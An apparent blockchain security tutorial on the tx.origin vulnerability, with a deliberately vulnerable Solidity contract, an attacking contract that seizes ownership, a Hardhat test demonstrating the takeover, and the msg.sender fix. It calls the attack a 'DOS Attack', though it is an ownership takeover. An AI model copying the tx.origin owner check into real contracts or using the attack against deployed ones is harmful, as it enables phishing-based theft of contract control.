# Attack with tx.origin

tx.origin is a global variable which returns the address that sent the transaction, we will learn how incorrect use of tx.origin could lead to security vulnerabilities in smart contracts

Lets goo üöÄ


## What is tx.origin?

`tx.origin` is a global variable which returns the address of the account which sent the transaction. Now you might be wondering then what is `msg.sender` ü§î. The difference is that `tx.origin` refers to the original external account(which is the user) that started the transaction and `msg.sender` is the immediate account that called the function and it can be an external account or another contract calling the function.


## DOS Attack on a smart contract

### What will happen?

There will be two smart contracts - `Good.sol` and `Attack.sol`. `Good.sol`. Initially the owner of `Good.sol` will be a good user. Using the attack function `Attack.sol` will be able to change the owner of `Good.sol` to iteself


### Build

Lets build an example where you can experience how the the attack happens.

- To setup a Hardhat project, Open up a terminal and execute these commands

  ```bash
  npm init --yes
  npm install --save-dev hardhat
  ```

- In the same directory where you installed Hardhat run:

  ```bash
  npx hardhat
  ```

  - Select `Create a basic sample project`
  - Press enter for the already specified `Hardhat Project root`
  - Press enter for the question on if you want to add a `.gitignore`
  - Press enter for `Do you want to install this sample project's dependencies with npm (@nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers)?`

Now you have a hardhat project ready to go!

If you are not on mac, please do this extra step and install these libraries as well :)

```bash
npm install --save-dev @nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers
```

and press `enter` for all the questions.

Now  create a contract named `Attack.sol` within the `contracts` directory and write thee following lines of code

```solidity
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./Good.sol";


contract Attack {
    Good public good;
    constructor(address _good) {
        good = Good(_good);
    }

    function attack() public {
        good.setOwner(address(this));
    }
}
```

After creating, `Attack.sol` in the same `contracts` directory create a new file `Good.sol`

```solidity
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;


contract Good  {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function setOwner(address newOwner) public {
        require(tx.origin == owner, "Not owner" );
        owner = newOwner;
    }
}
```


Now lets try immitating the attack using a sample test, create a new file under `test` folder named `attack.js` and add the following lines of code to it

```javascript
const { expect } = require("chai");
const { BigNumber } = require("ethers");
const { ethers, waffle } = require("hardhat");

describe("Attack", function () {
  it("Attack.sol will be able to change the owner of Good.sol", async function () {
    // Get one address
    const [_, addr1] = await ethers.getSigners();

    // Deploy the good contract
    const goodContract = await ethers.getContractFactory("Good");
    const _goodContract = await goodContract.connect(addr1).deploy();
    await _goodContract.deployed();
    console.log("Good Contract's Address:", _goodContract.address);

    // Deploy the Attack contract
    const attackContract = await ethers.getContractFactory("Attack");
    const _attackContract = await attackContract.deploy(_goodContract.address);
    await _attackContract.deployed();
    console.log("Attack Contract's Address", _attackContract.address);

    // Now lets trying making addr3 teh current winner of the auction
    let tx = await _attackContract.connect(addr1).attack();
    await tx.wait();

    // Now lets check if the current owner of Good.sol is actually Attack.sol
    expect(await _goodContract.owner()).to.equal(_attackContract.address);
  });
});
```

The attack will happen as follows, initially addr1 will deploy `Good.sol` and will be the owner but the attacker will somehow fool the user who has the private key of addr1 to call the `attack` function with `Attack.sol`. 

When the user calls `attack` function with `addr1`,  `tx.origin` is set to `addr1`. `attack` function further calls `setOwner` function of `Good.sol` which first checks if `tx.origin` is indeed the owner which is `true` because the original transaction was indeed called by `addr1`. After verifying the owner, it sets the owner to `Attack.sol` 

And thus attacker is successfully able to change the owner of `Good.sol` ü§Ø

To run the test, in your terminal pointing to the root directory of this level execute the following command

```bash
npx hardhat test
```

When the tests pass, you will notice that the owner of `Good.sol` is now `Attack.sol`

## Prevention

- You should use `msg.sender` instead of `tx.origin` to not let this happen

Example:

```solidity

function setOwner(address newOwner) public {
    require(msg.sender == owner, "Not owner" );
    owner = newOwner;
}

```

Hope you liked this level ‚ù§Ô∏è, keep building.
